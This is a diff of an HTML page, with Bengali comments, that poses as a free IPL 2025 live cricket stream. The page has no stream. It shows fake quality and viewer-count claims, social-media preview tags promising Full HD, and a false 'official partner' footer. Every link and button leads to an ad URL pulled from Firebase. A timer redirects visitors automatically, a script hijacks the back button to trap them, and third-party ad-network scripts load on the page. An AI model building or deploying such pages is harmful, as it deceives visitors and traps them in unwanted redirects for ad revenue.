@@ -3,25 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IPL live today </title></title>
-<script src="https://pl29064950.profitablecpmratenetwork.com/74/23/45/742345aa93ef3f6565e029a2f3758862.js"></script>
+    
+    <!-- ব্রাউজার ট্যাব টাইটেল -->
+    <title id="tab-title">IPL LIVE TODAY 2025</title>
+
+    <!-- ==========================================================
+         🚀 FACEBOOK & WHATSAPP PREVIEW (STATIC META TAGS)
+         ফেসবুক প্রিভিউ বদলাতে হলে এই অংশটি পরিবর্তন করে Vercel-এ পুশ করবেন।
+    =========================================================== -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://ipl-live-today.vercel.app/">
+    <meta property="og:title" content="IPL LIVE MATCH TODAY 2025 🏏">
+    <meta property="og:description" content="Watch Live Cricket Match Today in Full HD. High speed server active. Click to watch live now.">
+    
+    <!-- প্রিভিউ ইমেজ: এখানে প্লে বাটন ওয়ালা ছবির লিংক দিবেন -->
+    <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEis_IPL_STADIUM.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+
+    <!-- Ad Network Script (Top) -->
+    <script src="https://pl29064950.profitablecpmratenetwork.com/74/23/45/742345aa93ef3f6565e029a2f3758862.js"></script>
 
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
     <!-- ==========================================================
-         🛠️ CONFIGURATION
+         🛠️ FIREBASE CONFIGURATION
     =========================================================== -->
     <script>
         const firebaseConfig = {
             apiKey: "AIzaSyA8QEySFOObEgBOZlB-TfHcffieRQccks4",
-  authDomain: "ipllive-f8087.firebaseapp.com",
-  databaseURL: "https://ipllive-f8087-default-rtdb.firebaseio.com",
-  projectId: "ipllive-f8087",
-  storageBucket: "ipllive-f8087.firebasestorage.app",
-  messagingSenderId: "502360269677",
-  appId: "1:502360269677:web:32ad3f138e9f863bd0f064",
+            authDomain: "ipllive-f8087.firebaseapp.com",
+            databaseURL: "https://ipllive-f8087-default-rtdb.firebaseio.com",
+            projectId: "ipllive-f8087",
+            storageBucket: "ipllive-f8087.firebasestorage.app",
+            messagingSenderId: "502360269677",
+            appId: "1:502360269677:web:32ad3f138e9f863bd0f064",
         };
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
@@ -70,23 +88,22 @@
             box-shadow: 0 0 100px rgba(0, 163, 255, 0.1);
         }
 
-        /* HERO SECTION */
         .hero-section {
             width: 100%;
             height: 480px; 
             position: relative;
             overflow: hidden;
+            background: #000;
         }
 
-        /* প্লে বাটন ডিজাইন */
         .play-overlay {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             z-index: 15;
-            width: 80px;
-            height: 80px;
+            width: 85px;
+            height: 85px;
             background: rgba(0, 163, 255, 0.3);
             border: 3px solid #fff;
             border-radius: 50%;
@@ -116,7 +133,7 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
-            transform: scale(1.05);
+            transition: 0.5s;
         }
 
         .overlay {
@@ -158,9 +175,9 @@
             font-family: 'Bebas Neue', cursive;
             font-size: 16px;
             color: #fff;
+            letter-spacing: 1px;
         }
 
-        /* CONTENT AREA */
         .content {
             padding: 0 25px 50px;
             margin-top: -80px;
@@ -172,8 +189,8 @@
         h1 {
             font-family: 'Bebas Neue', cursive;
             font-size: 42px;
-            line-height: 1;
-            margin-bottom: 12px;
+            line-height: 1.1;
+            margin-bottom: 15px;
             background: linear-gradient(to right, #fff, var(--primary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -226,6 +243,7 @@
             font-size: 11px;
             color: #555;
             text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         #timer-count { color: var(--primary); font-weight: 900; }
@@ -235,30 +253,27 @@
             padding: 40px;
             text-align: center;
             font-size: 10px;
-            color: #333;
+            color: #444;
             letter-spacing: 2px;
         }
 
         @media (max-width: 480px) {
             .hero-section { height: 350px; }
             h1 { font-size: 34px; }
+            .play-overlay { width: 70px; height: 70px; }
         }
     </style>
 </head>
 <body>
 
 <div class="arena-wrapper">
-    <!-- ক্লিকেবল হিরো সেকশন -->
     <a id="img-link" href="#" style="text-decoration: none; color: inherit;">
         <div class="hero-section">
             <div class="live-indicator">
                 <div class="red-dot"></div>
                 <span>LIVE NOW</span>
             </div>
-            
-            <!-- প্লে বাটন আইকন -->
             <div class="play-overlay"></div>
-
             <img id="m-img" src="" alt="Live Arena">
             <div class="overlay"></div>
         </div>
@@ -266,30 +281,27 @@
 
     <div class="content">
         <h1 id="m-title">SYNCING SERVER...</h1>
-        
         <div class="stats-row">
             <div class="stat-item">QUALITY <span>4K HD</span></div>
             <div class="stat-item">VIEWERS <span id="m-viewers">0</span></div>
             <div class="stat-item">FPS <span>60 FPS</span></div>
         </div>
-
         <div class="btn-group">
             <a id="link-1" href="#" class="btn btn-main">▶ START STREAMING</a>
             <a id="link-2" href="#" class="btn btn-sub">SERVER 2 (LOW DATA)</a>
             <a id="link-3" href="#" class="btn btn-sub">SERVER 3 (MULTI-CAM)</a>
         </div>
-
         <div class="redirect-status">
-            Syncing with Arena Server in <span id="timer-count">0</span>s...
+            Connecting to Arena Server in <span id="timer-count">0</span>s...
         </div>
     </div>
 
-    <footer>Official Arena Streaming Partner • IPL 2025</footer>
+    <footer>OFFICIAL ARENA STREAMING PARTNER • 2025</footer>
 </div>
 
 <script>
-    // ১. ইলিমেন্ট সিলেক্টর
     const titleEl = document.getElementById('m-title');
+    const tabTitle = document.getElementById('tab-title');
     const imgEl = document.getElementById('m-img');
     const viewerEl = document.getElementById('m-viewers');
     const timerEl = document.getElementById('timer-count');
@@ -298,27 +310,21 @@
 
     let timerStarted = false;
 
-    // ২. ইন্টারফেস আপডেট
     function renderUI() {
         titleEl.innerText = LOCAL_CONFIG.match_title;
+        document.title = LOCAL_CONFIG.match_title; // ব্রাউজার ট্যাব টাইটেল
         imgEl.src = LOCAL_CONFIG.hero_image;
         viewerEl.innerText = LOCAL_CONFIG.viewers_count;
-        
-        // সব লিংকে অ্যাড লিংক সেট করা
         imgLink.href = LOCAL_CONFIG.adsterra_link;
-        btnLinks.forEach(link => {
-            link.href = LOCAL_CONFIG.adsterra_link;
-        });
+        btnLinks.forEach(link => { link.href = LOCAL_CONFIG.adsterra_link; });
     }
 
-    // ৩. টাইমার লজিক
     function startRedirectTimer(seconds) {
         if(timerStarted) return;
         timerStarted = true;
         let timeLeft = seconds;
-        
         const countdown = setInterval(() => {
-            timerEl.innerText = timeLeft;
+            if(timerEl) timerEl.innerText = timeLeft;
             if(timeLeft <= 0) {
                 clearInterval(countdown);
                 window.location.href = LOCAL_CONFIG.adsterra_link;
@@ -327,7 +333,6 @@
         }, 1000);
     }
 
-    // ৪. ফায়ারবেস কানেকশন
     const dbRef = database.ref('match_data');
     dbRef.on('value', (snapshot) => {
         const data = snapshot.val();
@@ -337,7 +342,6 @@
             LOCAL_CONFIG.adsterra_link = data.link || LOCAL_CONFIG.adsterra_link;
             LOCAL_CONFIG.timer_seconds = data.timer || LOCAL_CONFIG.timer_seconds;
             LOCAL_CONFIG.viewers_count = data.viewers || LOCAL_CONFIG.viewers_count;
-            
             renderUI();
             startRedirectTimer(parseInt(LOCAL_CONFIG.timer_seconds));
         } else {
@@ -346,14 +350,13 @@
         }
     });
 
-    // ৫. ব্যাক বাটন হাইজ্যাক
     (function() {
         window.history.pushState({page: 1}, "", "");
-        window.onpopstate = function() {
-            window.location.href = LOCAL_CONFIG.adsterra_link;
-        };
+        window.onpopstate = function() { window.location.href = LOCAL_CONFIG.adsterra_link; };
     })();
 </script>
+
+<!-- Ad Network Script (Bottom) -->
 <script src="https://pl29064963.profitablecpmratenetwork.com/3d/e8/02/3de8024191fc609cb4a3d99ac9fc839e.js"></script>
 
 </body>
